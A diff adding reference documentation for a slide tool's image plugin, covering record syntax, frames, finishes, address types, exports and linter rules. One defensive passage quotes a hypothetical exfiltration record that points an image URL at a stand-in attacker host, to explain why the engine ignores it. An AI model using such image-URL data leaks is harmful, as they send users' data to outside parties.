@@ -1,0 +1,104 @@
+# image
+
+A picture, written in inline code on a line of its own:
+
+```markdown
+`@image{sample:photo-wide.jpg, title="Q3 offsite", description="The field team at Lake Louise, site 14 of 40.", frame=mat, nimbus}`
+```
+
+Markdown's own image is the same picture with nothing set: `![Q3 offsite](sample:photo-wide.jpg "The field team at Lake Louise")`
+is `@image{sample:photo-wide.jpg, title="Q3 offsite", description="The field team at Lake Louise"}`. Every editor, GitHub and every
+Markdown tool still shows it. Write the record when you want a frame, a finish, a tone or a size.
+
+The record describes the picture. The slide places it:
+
+| The slide | The picture becomes |
+|---|---|
+| an `image` slide | the layout's photo panel; the layout picks the composition from the photo's shape. `mirror` puts it on the left |
+| a slide with `bleed` | the slide's background, cropped to fill it. Pair it with `dark` so the words read |
+| a `collage` | one of the tiles it packs (a list of records or Markdown images) |
+| any other slide | a figure in the slide's flow, sized by the record |
+
+This is a **plugin** (`engineering/decisions/2026-09-27-plugin-system.md`), on by default. Design:
+`engineering/decisions/2026-10-16-media-plugins.md`.
+
+## The record
+
+```markdown
+`@image{ADDRESS, title="…", description="…", focus=…, sm|md|lg, frame=…, nimbus|halo|meridian, duotone|grayscale, show=…}`
+```
+
+| Word | Meaning |
+|---|---|
+| the address | First, required: a path beside the deck, a `sample:` name (Lattice's sample art), an `asset:` name (a photo in the Studio Library), or a web address. Quote it when it holds `=`, `,` or a space. |
+| `title="…"` | What the picture is called. It names the picture for a screen reader and the tooltip, and narration speaks it. Hidden on the slide unless `show=` asks for it: the slide's heading already sets the context. Without a title the picture is decorative, so a screen reader skips it rather than reading a file name. |
+| `description="…"` | What it shows, in a sentence or two: for the tooltip, the print notes and narration, after the title. |
+| `focus=…` | `top`, `bottom`, `left`, `right` or `center`: the part that must stay in view when a layout crops the picture. |
+| `sm` `md` `lg` | The picture's size, `md` by default: a nudge of about a fifth either way, never past the box the slide gives it, and never so small it cannot be seen. |
+| `frame=…` | `mat` (a gallery mat), `keyline` (one accent hairline), `float` (lifted on a soft shadow), `device` (a screen bezel) or `corners` (registration brackets). Bare or as `frame=mat`. None by default. |
+| `nimbus` `halo` `meridian` | A finish: the deck's own looks as a light layer over the photograph. A strength follows the name: `nimbus=40`, from `20` to `80` and `full`. Alone, each takes a strength tuned for photographs. |
+| `duotone` `grayscale` | A tone: the picture in two of the deck's colors, or in grays. Full unless the record says `duotone=60`. |
+| `show=…` | Which words the slide shows under the picture: `none` (the default for a picture), `title`, or `all`. Hidden words still reach a screen reader, the tooltip, the print notes and narration. |
+
+One finish and one tone at a time; two finishes leave the record as code, and `lint:deck` says why. The record goes on a
+line of its own, with a blank line above and below. For a picture inside a sentence, write Markdown's `![title](src)`.
+
+## Setting it for the whole deck
+
+The `image:` register sets any of these once, the way `icon:` and `avatar:` do:
+
+```markdown
+---
+image: mat nimbus=40
+---
+```
+
+A slide's own class overrides the deck (`<!-- _class: content image-keyline -->`), and a record's own word overrides both. A
+layout that places the picture itself (a collage tile, a `bleed` background, the `image` slide's panel) decides its frame and
+size, so those words have nothing to act on there; each layout's guide says what it decides, in its "Media inside" section.
+
+## Where the address can point
+
+| Address | Example | Notes |
+|---|---|---|
+| A path | `photos/team.jpg` | Beside the deck. A path that leaves the deck's folder draws the stand-in. |
+| `sample:` | `sample:photo-wide.jpg` | Lattice's sample art (`lib/samples/README.md`): for trying a layout before you have the photo. |
+| `asset:` | `asset:offsite-14` | A photo in the Studio Library. In the CLI, a file named so in `assets/` beside the deck. |
+| A web address | `https://…/team.jpg` | Shown only after the reader allows web pictures; until then, a placeholder. `lint:deck` warns (`image-web-source`). |
+
+## In an export
+
+PDF, PNG and PowerPoint draw the picture with its frame, finish and tone. The HTML player and the Studio draw the same.
+Export-to-Marp writes the picture in Marp's own spelling (`![bg](…)` on an `image` or `bleed` slide, `![title](src)` elsewhere);
+the frame, finish, tone and size do not cross, and the bundle's README says so.
+
+## The address comes only from the record
+
+Nothing in this plugin reads a slide's text or its rendered page. The engine reads the address from your own `@image{…}`
+span, or your own `![…](…)` image, while it parses the Markdown. A zip plugin's drawing is text on the slide, so a plugin that
+wrote `@image{https://attacker.example/?d=…}` into its output gets no picture from Lattice: the record is never redrawn from a
+finished page, and every picture, a plugin's own included, still waits for the reader's consent before it loads from the web.
+
+## What the linter says
+
+| Rule | When |
+|---|---|
+| `image-marp-keyword` | A Marp `![bg …](…)` line. Retired: `--fix` rewrites it into the record and moves its placement to the slide (`left` becomes `mirror`; on a slide that is not an `image` slide, the slide gains `bleed`). |
+| `image-not-alone` | A record in running text, which stays code. |
+| `image-extra-panel` | A second record on one `image` slide, which the layout seats over the first. |
+| `image-web-source` | A picture from another site. Save it beside the deck instead. |
+| `unknown-image` | A word the `image:` register does not know. |
+
+## What stays literal
+
+A record in running text, in a code fence, or with words that contradict each other stays code. To show a record as text on
+purpose, put a backslash before the `@`: `` `\@image{photo.jpg}` ``.
+
+## Anti-patterns
+
+- **Placement in the record.** `@image{x.jpg, left, 40%}` is not a thing: the slide places the picture. Use the `image` slide
+  (with `mirror` for the left), `bleed`, or a layout that seats pictures.
+- **A caption that repeats the heading.** Leave the title hidden (the default) when the heading already says it.
+- **A finish to rescue a weak photo.** A finish belongs to the deck's look; a photo that needs one to be legible needs a better
+  photo.
+- **`grayscale` for "less important".** A tone is a look, not a hierarchy; the layout carries emphasis.
